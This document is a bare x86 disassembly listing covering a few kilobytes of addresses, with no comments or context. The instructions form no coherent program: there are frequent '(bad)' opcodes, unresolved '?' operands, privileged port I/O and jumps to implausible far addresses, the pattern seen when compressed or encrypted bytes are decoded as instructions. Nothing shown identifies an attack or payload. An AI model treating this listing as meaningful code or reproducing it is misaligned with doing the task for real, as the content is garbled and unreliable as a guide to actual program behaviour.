  41dfd6:	cmc    
  41dfd7:	int    0xdc
  41dfd9:	loope  0x41dfdb
  41dfdb:	push   es
  41dfdc:	fadd   st(3),st
  41dfde:	test   DWORD PTR [esi+0x7776f567],ebx
  41dfe4:	mov    ecx,0x80b28b4a
  41dfe9:	xor    ch,bh
  41dfeb:	in     al,dx
  41dfec:	int    0xbe
  41dfee:	ja     0x41df98
  41dff0:	push   eax
  41dff1:	(bad)  
  41dff2:	aad    0xf8
  41dff4:	ja     0x41dfa7
  41dff6:	cmp    ebp,DWORD PTR [eax+0x474f5494]
  41dffc:	cmp    esp,DWORD PTR [edx-0x3ac238af]
  41e002:	cmc    
  41e003:	(bad)  
  41e005:	outs   dx,BYTE PTR ds:[esi]
  41e006:	adc    eax,edx
  41e008:	mov    ds:0x33a5cb2a,eax
  41e00d:	(bad)  
  41e00f:	cmp    eax,0x21164cca
  41e014:	fmul   DWORD PTR [edi+eiz*1-0x48]
  41e018:	lahf   
  41e019:	fmul   QWORD PTR [eax-0xb]
  41e01c:	mov    ds:0x13672e2b,al
  41e021:	sahf   
  41e022:	push   eax
  41e023:	outs   dx,BYTE PTR ds:[esi]
  41e024:	jp     0x41e00b
  41e026:	scas   eax,DWORD PTR es:[edi]
  41e027:	es clc 
  41e029:	push   ecx
  41e02a:	outs   dx,BYTE PTR ds:[esi]
  41e02b:	cwde   
  41e02c:	nop
  41e02d:	lds    ebx,FWORD PTR [esi]
  41e02f:	mov    ch,0xbb
  41e031:	or     al,0xd3
  41e033:	rcl    BYTE PTR [esi+0x4f],0xc3
  41e037:	sbb    ch,ch
  41e039:	push   esi
  41e03a:	mov    bl,0x7c
  41e03c:	dec    edi
  41e03d:	div    DWORD PTR [edx+eax*2]
  41e040:	jmp    0x41e025
  41e042:	mov    ebp,0x2448fbe8
  41e047:	sbb    dh,bl
  41e049:	adc    ah,BYTE PTR [esi+0x2f]
  41e04c:	push   ss
  41e04d:	in     al,dx
  41e04e:	dec    esi
  41e04f:	dec    eax
  41e050:	in     eax,0x5a
  41e052:	repz ja 0x41e099
  41e055:	nop
  41e056:	cmp    al,0xfb
  41e058:	loopne 0x41e053
  41e05a:	shl    BYTE PTR [ecx-0x537639cd],0xab
  41e061:	test   cl,0xcf
  41e064:	cmp    al,0xf1
  41e066:	jne    0x41e0d2
  41e068:	cmp    eax,0x83f93659
  41e06d:	scas   eax,DWORD PTR es:[edi]
  41e06e:	dec    esp
  41e06f:	jne    0x41e0e4
  41e071:	cdq    
  41e072:	sub    BYTE PTR [esi-0x51],dh
  41e075:	or     DWORD PTR [ecx+0x18b74a88],0x5b25ea6d
  41e07f:	push   eax
  41e080:	dec    esp
  41e081:	mov    BYTE PTR [ebx],bh
  41e083:	aaa    
  41e084:	push   ds
  41e085:	mov    eax,ds:0x823b5dcb
  41e08a:	int3   
  41e08b:	xor    cl,ch
  41e08d:	sub    eax,0xb4984a21
  41e092:	in     al,dx
  41e093:	ja     0x41e09e
  41e095:	pop    esp
  41e096:	test   al,0x1e
  41e098:	push   ecx
  41e099:	inc    esp
  41e09a:	adc    ah,ah
  41e09c:	jne    0x41e069
  41e09e:	cmpps  xmm5,XMMWORD PTR [ecx+esi*4-0x56047a75],0xc1
  41e0a7:	adc    ebx,DWORD PTR [bx+si-0x4398]
  41e0ac:	into   
  41e0ad:	jno    0x41e05b
  41e0af:	dec    edx
  41e0b0:	loop   0x41e0bc
  41e0b2:	(bad)  
  41e0b3:	imul   eax,DWORD PTR [eax+0x66],0x3e
  41e0b7:	jecxz  0x41e122
  41e0b9:	sar    DWORD PTR [edi+0x25],cl
  41e0bc:	push   ds
  41e0bd:	jg     0x41e126
  41e0bf:	ret    
  41e0c0:	xor    eax,0x1ffc2f64
  41e0c5:	rcr    BYTE PTR [ebx+ecx*2-0x3a],1
  41e0c9:	jns    0x41e0fd
  41e0cb:	xchg   BYTE PTR [ebx],al
  41e0cd:	inc    ecx
  41e0ce:	addr16 dec edi
  41e0d0:	push   0xffffffe1
  41e0d2:	mov    eax,0xa7f06226
  41e0d7:	popa   
  41e0d8:	xor    BYTE PTR [ecx],ch
  41e0da:	dec    esp
  41e0db:	add    al,0x28
  41e0dd:	(bad)  
  41e0df:	hlt    
  41e0e0:	rol    DWORD PTR [ecx-0x6e1cdec9],0xe4
  41e0e7:	clc    
  41e0e8:	xor    al,0x17
  41e0ea:	jne    0x41e122
  41e0ec:	sti    
  41e0ed:	jp     0x41e0ec
  41e0ef:	xor    BYTE PTR [edi+0x10],dl
  41e0f2:	jo     0x41e139
  41e0f4:	(bad)  
  41e0f5:	jl     0x41e0a5
  41e0f7:	cli    
  41e0f8:	(bad)  
  41e0f9:	fwait
  41e0fa:	pop    eax
  41e0fb:	lods   al,BYTE PTR ds:[esi]
  41e0fc:	cld    
  41e0fd:	jns    0x41e15c
  41e0ff:	stc    
  41e100:	stos   DWORD PTR es:[edi],eax
  41e101:	dec    ebp
  41e102:	imul   BYTE PTR [edi]
  41e104:	adc    edx,DWORD PTR [eax]
  41e106:	ins    BYTE PTR es:[edi],dx
  41e107:	fwait
  41e108:	pop    ss
  41e109:	sub    eax,0x1cbd28a7
  41e10e:	dec    ebp
  41e10f:	jl     0x41e121
  41e111:	xor    BYTE PTR [ebp-0x1a],dl
  41e114:	or     eax,0xaed28c54
  41e119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e11a:	jmp    0x56eb179c
  41e11f:	fisttp WORD PTR [ecx-0x27d44b7b]
  41e125:	fcomip st,st(1)
  41e127:	push   ss
  41e128:	gs jecxz 0x41e0bc
  41e12b:	dec    ebx
  41e12c:	add    ebx,DWORD PTR [esi+0x4c]
  41e12f:	xchg   ecx,edx
  41e131:	adc    edi,DWORD PTR [edx]
  41e133:	jo     0x41e139
  41e135:	xchg   ecx,eax
  41e136:	pop    edx
  41e137:	std    
  41e138:	test   edx,esi
  41e13a:	addr16 mov bl,0xd8
  41e13d:	dec    ebx
  41e13e:	mov    esp,0x90f4599
  41e143:	daa    
  41e144:	and    eax,0x9c55edfb
  41e149:	dec    ecx
  41e14a:	shl    BYTE PTR [edi],1
  41e14c:	jnp    0x41e1ad
  41e14e:	daa    
  41e14f:	aaa    
  41e150:	dec    BYTE PTR [esi+0xf]
  41e153:	and    eax,0x4a634d47
  41e158:	call   0x3c87165a
  41e15d:	lahf   
  41e15e:	or     BYTE PTR [eax+0x57967352],bh
  41e164:	push   edi
  41e165:	mov    DWORD PTR [eax],esp
  41e167:	shl    DWORD PTR [esi-0x49],0xb3
  41e16b:	retf   0xd9e5
  41e16e:	inc    esi
  41e16f:	adc    DWORD PTR [edx-0x7b],0xffffffa4
  41e173:	cmc    
  41e174:	lods   eax,DWORD PTR ds:[esi]
  41e175:	add    bl,bl
  41e177:	ss jg  0x41e1e6
  41e17a:	sti    
  41e17b:	mov    ?,ebp
  41e17d:	adc    eax,0x2c2eb870
  41e182:	test   BYTE PTR [edi-0x168a43be],dh
  41e188:	xchg   esp,eax
  41e189:	push   esi
  41e18a:	sbb    eax,0x664981a0
  41e18f:	mov    ebx,0x1cdeda6b
  41e194:	sub    cl,BYTE PTR [ecx+eax*4]
  41e197:	mov    al,ah
  41e199:	fs int3 
  41e19b:	xchg   esp,eax
  41e19c:	test   DWORD PTR [eax-0x3ffa92bb],0x84783320
  41e1a6:	fmulp  st(5),st
  41e1a8:	setl   BYTE PTR [esi-0x58f03a9a]
  41e1af:	loope  0x41e17b
  41e1b1:	push   cs
  41e1b2:	in     al,dx
  41e1b3:	je     0x41e203
  41e1b5:	rcl    ebp,0xa4
  41e1b8:	mov    eax,ds:0x91171503
  41e1bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1be:	loope  0x41e236
  41e1c0:	mov    edx,0x9e2a1e35
  41e1c5:	mov    ds:0xba4a5730,al
  41e1ca:	push   eax
  41e1cb:	sub    al,BYTE PTR [ebx]
  41e1cd:	adc    dh,cl
  41e1cf:	jbe    0x41e153
  41e1d1:	ins    DWORD PTR es:[edi],dx
  41e1d2:	pop    esp
  41e1d3:	mov    edi,DWORD PTR [ebx]
  41e1d5:	in     al,0xd9
  41e1d7:	pop    ecx
  41e1d8:	popa   
  41e1d9:	(bad)  
  41e1db:	mov    ah,0xd6
  41e1dd:	call   0xc2fa5dc4
  41e1e2:	sub    al,0x25
  41e1e4:	pop    eax
  41e1e5:	and    DWORD PTR [esi-0x459e25ad],ecx
  41e1eb:	call   0x97b6:0x8b744106
  41e1f2:	test   eax,0x23b0afc0
  41e1f7:	push   cs
  41e1f8:	xlat   BYTE PTR ds:[ebx]
  41e1f9:	sbb    eax,0xa46ea157
  41e1fe:	out    0xdb,al
  41e200:	arpl   WORD PTR [ecx],bx
  41e202:	(bad)  [edi-0x7b]
  41e205:	dec    edx
  41e206:	push   0x4d
  41e208:	cwde   
  41e209:	outs   dx,DWORD PTR ds:[esi]
  41e20a:	out    0x49,al
  41e20c:	add    esp,DWORD PTR [ecx+0x6c8cda5d]
  41e212:	dec    esp
  41e213:	adc    ecx,0xffffffc6
  41e216:	(bad)  
  41e217:	imul   ecx,DWORD PTR [eax+0x51a8d43b],0x39
  41e21e:	push   ecx
  41e21f:	mov    edi,0x5915b9a3
  41e224:	sbb    edx,ebx
  41e226:	ins    DWORD PTR es:[edi],dx
  41e227:	inc    esi
  41e228:	lods   al,BYTE PTR ds:[esi]
  41e229:	jmp    0x12ed429f
  41e22e:	cs push ecx
  41e230:	jmp    0x99bfb12e
  41e235:	je     0x41e1d4
  41e237:	cld    
  41e238:	nop
  41e239:	adc    edx,DWORD PTR [edx]
  41e23b:	(bad)  
  41e23c:	icebp  
  41e23d:	loope  0x41e28c
  41e23f:	xchg   ecx,eax
  41e240:	push   eax
  41e241:	xchg   esp,eax
  41e242:	sub    al,0x75
  41e244:	jo     0x41e235
  41e246:	fld    QWORD PTR [edi+0x5]
  41e249:	and    BYTE PTR [esp+ecx*4-0x6b46ce56],al
  41e250:	pop    eax
  41e251:	out    0xcf,eax
  41e253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e254:	xor    DWORD PTR [ebx+esi*1-0x1a4dd188],ecx
  41e25b:	add    BYTE PTR [ebp+0x64],0x8
  41e25f:	jecxz  0x41e2ce
  41e261:	test   al,0xa5
  41e263:	or     DWORD PTR [ebx+0x20817a11],eax
  41e269:	pop    esi
  41e26a:	aad    0x29
  41e26c:	(bad)  
  41e26e:	ret    0x3ced
  41e271:	test   al,0xce
  41e273:	rep lods al,BYTE PTR ds:[esi]
  41e275:	out    0x82,al
  41e277:	cmp    DWORD PTR [esi-0x4a],0xffffffe1
  41e27b:	adc    ebx,DWORD PTR [edi+0x2699b337]
  41e281:	loope  0x41e2a2
  41e283:	pop    ebp
  41e284:	arpl   WORD PTR [ecx+0x99f711f],si
  41e28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e28b:	jge    0x41e302
  41e28d:	jnp    0x41e255
  41e28f:	xor    DWORD PTR [ebx],edi
  41e291:	scas   eax,DWORD PTR es:[edi]
  41e292:	inc    ecx
  41e293:	dec    edx
  41e294:	jns    0x41e284
  41e296:	pop    es
  41e297:	out    dx,al
  41e298:	rcr    BYTE PTR ds:0xd190532a,0x60
  41e29f:	xor    ebx,ebp
  41e2a1:	aas    
  41e2a2:	test   BYTE PTR [ecx+0x4b],ch
  41e2a5:	ds stos DWORD PTR es:[edi],eax
  41e2a7:	sub    edx,ecx
  41e2a9:	stos   BYTE PTR es:[edi],al
  41e2aa:	push   esp
  41e2ab:	clc    
  41e2ac:	xchg   ebp,eax
  41e2ad:	lahf   
  41e2ae:	imul   eax,DWORD PTR [ebp-0x2ac58504],0xf6bc29cc
  41e2b8:	(bad)
  41e2bc:	sub    BYTE PTR [edi-0x11],0xd8
  41e2c0:	scas   al,BYTE PTR es:[edi]
  41e2c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2c2:	cmp    BYTE PTR [edi],bl
  41e2c4:	and    esi,DWORD PTR [esi]
  41e2c6:	fisub  DWORD PTR [esi-0x775e5b5]
  41e2cc:	retf   0x8c80
  41e2cf:	mov    ebp,0xa4a23c0d
  41e2d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d5:	stc    
  41e2d6:	dec    BYTE PTR [eax]
  41e2d8:	lea    esp,[eax+0x6cbdadec]
  41e2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2df:	mov    ebp,DWORD PTR [ebx-0x57af5e4b]
  41e2e5:	out    dx,eax
  41e2e6:	bound  esp,QWORD PTR [ebx+0x6e]
  41e2e9:	mulps  xmm2,XMMWORD PTR [edi]
  41e2ec:	out    dx,al
  41e2ed:	push   edi
  41e2ee:	mov    esp,0x909dcafb
  41e2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2f4:	inc    esp
  41e2f5:	xor    al,0x55
  41e2f7:	cmp    eax,0xc9408c0e
  41e2fc:	leave  
  41e2fd:	inc    eax
  41e2fe:	outs   dx,BYTE PTR ds:[esi]
  41e2ff:	enter  0xfef,0xc
  41e303:	inc    ebp
  41e304:	dec    ecx
  41e305:	pop    edi
  41e306:	pop    es
  41e307:	scas   al,BYTE PTR es:[edi]
  41e308:	in     al,dx
  41e309:	jmp    0x41e2d3
  41e30b:	pusha  
  41e30c:	ds sub eax,0x4337604b
  41e312:	dec    ebx
  41e313:	out    0x7,eax
  41e315:	(bad)  
  41e316:	sahf   
  41e317:	adc    DWORD PTR [edi+edi*8],edi
  41e31a:	jns    0x41e2c2
  41e31c:	icebp  
  41e31d:	mov    ebx,0x988c3d04
  41e322:	or     BYTE PTR [esi+0x2d51ced1],ch
  41e328:	cmp    al,0x13
  41e32a:	enter  0xa8b6,0x2f
  41e32e:	rol    cl,1
  41e330:	mov    ebp,0x7d4c082c
  41e335:	es push 0x81434e8a
  41e33b:	sub    esi,edx
  41e33d:	cmp    ecx,0x51c47bea
  41e343:	std    
  41e344:	pop    esi
  41e345:	push   edx
  41e346:	test   al,0x15
  41e348:	sub    esp,DWORD PTR [ecx+eiz*2-0x2b]
  41e34c:	fild   WORD PTR [eax+0x27]
  41e34f:	sti    
  41e350:	ret    0x8d0
  41e353:	data16 aad 0x1a
  41e356:	in     eax,dx
  41e357:	sub    DWORD PTR [ecx+0x6426aee2],edx
  41e35d:	inc    ebx
  41e35e:	pop    esi
  41e35f:	test   BYTE PTR [eax+0x5d],al
  41e362:	outs   dx,BYTE PTR ds:[esi]
  41e363:	iret   
  41e364:	sbb    DWORD PTR [edx-0x743a412c],edi
  41e36a:	mov    ah,0xcb
  41e36c:	sbb    al,0xa0
  41e36e:	sbb    DWORD PTR [ebp+0x666356c5],ebp
  41e374:	ret    0x2fa7
  41e377:	lods   al,BYTE PTR ds:[esi]
  41e378:	outs   dx,DWORD PTR ds:[esi]
  41e379:	es aaa 
  41e37b:	daa    
  41e37c:	and    eax,DWORD PTR [eax+0x15674995]
  41e382:	dec    edx
  41e383:	cdq    
  41e384:	xor    DWORD PTR [edi],edx
  41e386:	rcl    bl,0xd6
  41e389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38a:	push   0x6e7c7bcf
  41e38f:	sub    al,0x1e
  41e391:	dec    DWORD PTR [edx-0x4f73db73]
  41e397:	ds or  al,0xee
  41e39a:	imul   DWORD PTR [ebx+0x4c]
  41e39d:	push   eax
  41e39e:	int3   
  41e39f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3a0:	repz sub al,0x1f
  41e3a3:	pop    ecx
  41e3a4:	push   edi
  41e3a5:	(bad)  
  41e3a6:	pushf  
  41e3a7:	jmp    0x41e373
  41e3a9:	cmp    al,0x99
  41e3ab:	inc    ebx
  41e3ac:	popa   
  41e3ad:	push   es
  41e3ae:	add    ch,BYTE PTR [ebx+esi*1]
  41e3b1:	pushf  
  41e3b2:	inc    ecx
  41e3b3:	adc    DWORD PTR [eax-0x4f],esi
  41e3b6:	mov    ah,0x3c
  41e3b8:	xor    edx,esi
  41e3ba:	mov    al,BYTE PTR [edi-0x7fc9bff3]
  41e3c0:	pop    esp
  41e3c1:	dec    bl
  41e3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3c4:	jo     0x41e3db
  41e3c6:	(bad)  
  41e3c7:	and    al,0x2
  41e3c9:	pop    ss
  41e3ca:	sub    al,0x46
  41e3cc:	rcr    DWORD PTR [eax-0x7c],0x8c
  41e3d0:	jle    0x41e40c
  41e3d2:	cdq    
  41e3d3:	mov    ds:0xc7f4f16d,al
  41e3d8:	mov    cl,0x44
  41e3da:	mov    al,0xc5
  41e3dc:	aam    0x64
  41e3de:	mov    ebx,0xdfecb85c
  41e3e3:	cmp    al,0xd5
  41e3e5:	mov    ds:0x7660c1d4,eax
  41e3ea:	add    eax,0x98c378fd
  41e3ef:	popa   
  41e3f0:	adc    ebp,DWORD PTR [eax+0x5be474eb]
  41e3f6:	outs   dx,DWORD PTR ds:[esi]
  41e3f7:	sub    bh,BYTE PTR [esi-0x21]
  41e3fa:	sbb    DWORD PTR [edi+0x56d0cf02],edx
  41e400:	(bad)
  41e403:	add    DWORD PTR [edx-0x46101e6a],ebp
  41e409:	out    0x52,eax
  41e40b:	loope  0x41e3fb
  41e40d:	imul   ecx,DWORD PTR [ebx-0x3f],0x817410c7
  41e414:	dec    esp
  41e415:	dec    ebp
  41e416:	test   eax,0x9897906
  41e41b:	xor    BYTE PTR [ecx],bl
  41e41d:	pop    esp
  41e41e:	cmp    ebx,DWORD PTR [ecx-0x7f3bc49e]
  41e424:	sub    eax,DWORD PTR [ebx]
  41e426:	leave  
  41e427:	imul   ecx,DWORD PTR [esi],0xd22a52cb
  41e42d:	shl    BYTE PTR [ebp-0xe],1
  41e430:	fld    TBYTE PTR [esi+eiz*4-0x3e55f109]
  41e437:	mov    bh,BYTE PTR [edi-0x69]
  41e43a:	sbb    al,0xa5
  41e43c:	popa   
  41e43d:	pop    esi
  41e43e:	cld    
  41e43f:	nop
  41e440:	jnp    0x41e415
  41e442:	or     al,0xb2
  41e444:	ret    0xec45
  41e447:	popf   
  41e448:	mov    al,ds:0x8b1bfc66
  41e44d:	jno    0x41e464
  41e44f:	and    ebx,DWORD PTR [ebp+0x452f175f]
  41e455:	retf   
  41e456:	repnz adc dh,dh
  41e459:	jle    0x41e4a7
  41e45b:	stc    
  41e45c:	mov    ds:0xc5abaea2,al
  41e461:	dec    ebp
  41e462:	adc    ebp,DWORD PTR [edx-0x4eb46e9d]
  41e468:	stc    
  41e469:	pop    edi
  41e46a:	lock push 0x7130be94
  41e470:	call   0x3f4e4c15
  41e475:	ret    
  41e476:	mov    ds:0x3aee28ff,al
  41e47b:	aaa    
  41e47c:	stos   BYTE PTR es:[edi],al
  41e47d:	in     eax,dx
  41e47e:	add    BYTE PTR [edx-0x56],dl
  41e481:	retf   
  41e482:	xor    al,0xf1
  41e484:	jmp    0x43fa:0x83d79572
  41e48b:	enter  0xbe4f,0xe5
  41e48f:	in     al,0xbc
  41e491:	mov    WORD PTR [ebx-0x16],?
  41e494:	and    DWORD PTR [ebx],esp
  41e496:	add    edi,esi
  41e498:	dec    ebp
  41e499:	inc    edx
  41e49a:	push   ebp
  41e49b:	lods   al,BYTE PTR ds:[esi]
  41e49c:	jg     0x41e4fe
  41e49e:	sub    eax,ecx
  41e4a0:	aad    0x1
  41e4a2:	addr16 es test al,0x8
  41e4a6:	test   al,0x68
  41e4a8:	int    0x2b
  41e4aa:	jl     0x41e469
  41e4ac:	lahf   
  41e4ad:	hlt    
  41e4ae:	mov    edi,0xa7722bda
  41e4b3:	(bad)  
  41e4b4:	sub    al,BYTE PTR [eax-0x662557cb]
  41e4ba:	es jmp 0x41e465
  41e4bd:	and    BYTE PTR [esi+0x30],0x60
  41e4c1:	jmp    0x94b0fdb0
  41e4c6:	retf   
  41e4c7:	mov    ecx,0x599b0b39
  41e4cc:	rcl    BYTE PTR [ebx+0x2b],cl
  41e4cf:	sbb    al,0x5c
  41e4d1:	(bad)  
  41e4d2:	hlt    
  41e4d3:	jle    0x41e510
  41e4d5:	mov    esi,0xe68c53c1
  41e4da:	add    al,0x43
  41e4dc:	mov    bl,0x1a
  41e4de:	call   0x33e3f64c
  41e4e3:	xor    DWORD PTR [edx+0x7e146091],esi
  41e4e9:	or     eax,0x8
  41e4ec:	ror    DWORD PTR ss:[edx+0xf],cl
  41e4f0:	ret    0x196f
  41e4f3:	push   esp
  41e4f4:	fcomp  QWORD PTR [eax-0x70]
  41e4f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4f8:	sub    al,0x5e
  41e4fa:	pusha  
  41e4fb:	(bad)  
  41e4fc:	push   edx
  41e4fd:	add    ebx,DWORD PTR [eax+0x41f4f78]
  41e503:	enter  0x75d9,0xa2
  41e507:	scas   eax,DWORD PTR es:[edi]
  41e508:	sar    BYTE PTR [edi+0x1],cl
  41e50b:	cmp    eax,0x4b62833d
  41e510:	sbb    DWORD PTR [ebp+edi*8+0x5fd333ee],ebx
  41e517:	mov    bh,0x6
  41e519:	pusha  
  41e51a:	adc    BYTE PTR [ebp-0x6c],bh
  41e51d:	aam    0x7f
  41e51f:	mov    edx,0x73510105
  41e524:	inc    edx
  41e525:	das    
  41e526:	mov    edi,0xa06bc04
  41e52b:	outs   dx,BYTE PTR ds:[esi]
  41e52c:	push   ecx
  41e52d:	in     al,dx
  41e52e:	sbb    DWORD PTR [ebx],edx
  41e530:	imul   ecx,DWORD PTR [edi],0x74d38fdd
  41e536:	dec    eax
  41e537:	inc    ebx
  41e538:	lahf   
  41e539:	hlt    
  41e53a:	into   
  41e53b:	xchg   esi,eax
  41e53c:	mov    ds:0x6d5c535f,eax
  41e541:	leave  
  41e542:	push   esi
  41e543:	adc    DWORD PTR [esi+ebx*1],0xffffffc9
  41e547:	pop    edi
  41e548:	cmp    al,0xb
  41e54a:	dec    ecx
  41e54b:	out    dx,al
  41e54c:	das    
  41e54d:	dec    esi
  41e54e:	out    0x3d,eax
  41e550:	adc    edx,eax
  41e552:	mov    esi,0xb9967aed
  41e557:	xchg   dl,dl
  41e559:	pop    ebx
  41e55a:	sahf   
  41e55b:	mov    ebp,0x88837f6e
  41e560:	fadd   st(7),st
  41e562:	nop
  41e563:	xchg   esp,eax
  41e564:	cdq    
  41e565:	cmp    al,al
  41e567:	leave  
  41e568:	adc    bl,dl
  41e56a:	inc    edi
  41e56b:	sub    eax,0x7b8ebba4
  41e570:	aad    0x51
  41e572:	pushf  
  41e573:	fldenv [ecx]
  41e575:	and    eax,0xfffffff9
  41e578:	sbb    BYTE PTR [ebp+ecx*4+0x34796fcd],ch
  41e57f:	xor    dl,BYTE PTR [esi+0x62]
  41e582:	push   esp
  41e583:	sub    BYTE PTR [esi],al
  41e585:	inc    ebx
  41e586:	push   ebp
  41e587:	add    bh,BYTE PTR [ecx-0x2c3557a2]
  41e58d:	sbb    BYTE PTR [edi],al
  41e58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e590:	clc    
  41e591:	mul    BYTE PTR [ecx+0x5c63606d]
  41e597:	int    0xd4
  41e599:	repnz xchg esi,eax
  41e59b:	sbb    al,0xe4
  41e59d:	xchg   ebx,eax
  41e59e:	xor    BYTE PTR [esi-0x69],0x8c
  41e5a2:	mov    edi,0xbe5d8d80
  41e5a7:	ins    BYTE PTR es:[edi],dx
  41e5a8:	gs or  eax,0x9ed1ea8d
  41e5ae:	sub    bh,BYTE PTR [ecx+eax*8+0x579bbf8a]
  41e5b5:	hlt    
  41e5b6:	mov    ecx,0x19190f91
  41e5bb:	sub    eax,0x8b79b45e
  41e5c0:	xchg   edi,eax
  41e5c1:	inc    eax
  41e5c2:	mov    dh,0x5b
  41e5c4:	into   
  41e5c5:	mov    ah,ch
  41e5c7:	push   edi
  41e5c8:	mov    eax,ds:0x3472e0fc
  41e5cd:	aas    
  41e5ce:	ficom  WORD PTR [ebp+0x69]
  41e5d1:	or     BYTE PTR [esi],bl
  41e5d3:	or     al,0x5c
  41e5d5:	sbb    BYTE PTR [esi+0x2317957],ah
  41e5db:	sbb    BYTE PTR [eax-0x1294c4fc],ch
  41e5e1:	sub    al,BYTE PTR [edi]
  41e5e3:	or     al,0x24
  41e5e5:	cmp    ecx,DWORD PTR [eax-0x416e3d58]
  41e5eb:	imul   ebx,DWORD PTR [edi+eax*4],0x1f574003
  41e5f2:	mov    esp,0xbeea566d
  41e5f7:	cwde   
  41e5f8:	in     al,dx
  41e5f9:	or     edi,DWORD PTR [esi]
  41e5fb:	add    DWORD PTR [edi+0x39a3823b],ebp
  41e601:	push   ebp
  41e602:	in     eax,dx
  41e603:	push   ss
  41e604:	(bad)  
  41e605:	push   esi
  41e606:	shl    ch,cl
  41e608:	sbb    ebp,ecx
  41e60a:	std    
  41e60b:	test   al,0x5
  41e60d:	mov    ebp,0x44bccbf6
  41e612:	jmp    0x41e684
  41e614:	add    eax,0xed1e4adf
  41e619:	mov    es,esi
  41e61b:	mov    edx,0xd53464c3
  41e620:	(bad)  
  41e621:	sti    
  41e622:	dec    edx
  41e623:	inc    ebp
  41e624:	hlt    
  41e625:	into   
  41e626:	or     eax,0x2b9ac062
  41e62b:	mov    esi,0xa38655c8
  41e630:	sub    bl,BYTE PTR [eax+esi*1-0x4a]
  41e634:	(bad)  
  41e635:	retf   
  41e636:	stos   DWORD PTR es:[edi],eax
  41e637:	sahf   
  41e638:	mov    eax,db3
  41e63b:	imul   ebp,DWORD PTR [ebp+eiz*2-0x57ed77c8],0xa708934c
  41e646:	mov    WORD PTR [edx-0x540fb910],es
  41e64c:	aaa    
  41e64d:	mov    gs,WORD PTR [ebp-0x66]
  41e650:	push   edi
  41e651:	(bad)  
  41e652:	lea    eax,ds:0x4400782
  41e658:	cmp    al,0xfa
  41e65a:	das    
  41e65b:	test   eax,0x81d6e319
  41e660:	jg     0x41e696
  41e662:	idiv   BYTE PTR [ecx+0x5c]
  41e665:	imul   edx,DWORD PTR [esi+0x136b00c9],0xffffffe5
  41e66c:	stos   DWORD PTR es:[edi],eax
  41e66d:	jne    0x41e6be
  41e66f:	add    eax,0xe3a0b8bb
  41e674:	pop    ebp
  41e675:	xchg   esi,eax
  41e676:	dec    ebx
  41e677:	neg    cx
  41e67a:	sbb    eax,0xa35824c3
  41e67f:	test   edx,0xc84c99fd
  41e685:	ret    
  41e686:	pop    ds
  41e687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e688:	sub    BYTE PTR [edx+0x63],bh
  41e68b:	or     al,0xc4
  41e68d:	xchg   ebx,eax
  41e68e:	mov    BYTE PTR ds:0x1aa03783,ah
  41e694:	in     eax,0xb2
  41e696:	push   ebx
  41e697:	adc    esi,ecx
  41e699:	aas    
  41e69a:	(bad)  
  41e69b:	mov    eax,0x94dbe161
  41e6a0:	inc    eax
  41e6a1:	stos   BYTE PTR es:[edi],al
  41e6a2:	sar    DWORD PTR [ecx-0x2b],cl
  41e6a5:	dec    esi
  41e6a6:	push   cs
  41e6a7:	pop    es
  41e6a8:	or     DWORD PTR [edi-0x44d1ce95],ebx
  41e6ae:	xor    edx,DWORD PTR [edx]
  41e6b0:	add    BYTE PTR [edi*8-0x1c871bf5],ah
  41e6b7:	inc    esi
  41e6b8:	mov    bh,0xd1
  41e6ba:	pop    ecx
  41e6bb:	into   
  41e6bc:	jle    0x41e6fe
  41e6be:	ret    0xf648
  41e6c1:	pop    edi
  41e6c2:	sbb    eax,0xe9c118f9
  41e6c7:	sub    BYTE PTR [eax-0x413a2a7d],ah
  41e6cd:	mov    edx,0x1c81e94f
  41e6d2:	mov    esi,0x9cf860e4
  41e6d7:	jg     0x41e6d3
  41e6d9:	out    0x66,eax
  41e6db:	push   0x4e
  41e6dd:	push   ds
  41e6de:	xor    ecx,DWORD PTR [edx-0x8]
  41e6e1:	shr    BYTE PTR [ecx],1
  41e6e3:	jge    0x41e6aa
  41e6e5:	push   edx
  41e6e6:	loopne 0x41e66a
  41e6e8:	icebp  
  41e6e9:	adc    eax,0xb7fc5e7b
  41e6ee:	add    ebx,ebp
  41e6f0:	in     al,dx
  41e6f1:	sbb    ebx,DWORD PTR [eax-0x69]
  41e6f4:	xor    ah,bl
  41e6f6:	jecxz  0x41e6a3
  41e6f8:	xor    ah,BYTE PTR [esi+0x48e9fb2e]
  41e6fe:	jmp    0x41e6b8
  41e700:	and    ecx,0xffffffac
  41e703:	dec    esp
  41e704:	aam    0x63
  41e706:	cmp    eax,0x2ccf7a8e
  41e70b:	push   ecx
  41e70c:	inc    edx
  41e70d:	mov    dl,0x6d
  41e70f:	leave  
  41e710:	jnp    0x41e72f
  41e712:	test   eax,0x7ad067f4
  41e717:	mov    ds:0xea5bb2ae,al
  41e71c:	sbb    ch,ch
  41e71e:	fsubr  QWORD PTR [eax]
  41e720:	dec    ebp
  41e721:	mov    WORD PTR [ecx-0x3ae8784c],?
  41e727:	scas   eax,DWORD PTR es:[edi]
  41e728:	adc    edi,ebx
  41e72a:	mov    ebp,0x8f7e33d5
  41e72f:	xchg   ebx,eax
  41e730:	int    0xb
  41e732:	xchg   ebp,eax
  41e733:	cmp    eax,0xfd9d94eb
  41e738:	and    DWORD PTR [edx+0x6671cae4],edx
  41e73e:	dec    ebp
  41e73f:	idiv   DWORD PTR [edx]
  41e741:	in     eax,0x6e
  41e743:	stc    
  41e744:	inc    ebp
  41e745:	into   
  41e746:	les    esp,FWORD PTR [esi-0x67]
  41e749:	es ja  0x41e741
  41e74c:	sbb    eax,0x91a3767
  41e751:	sar    edi,0xb8
  41e754:	mov    ebp,0xd1941e94
  41e759:	mov    esp,?
  41e75b:	addr16 fwait
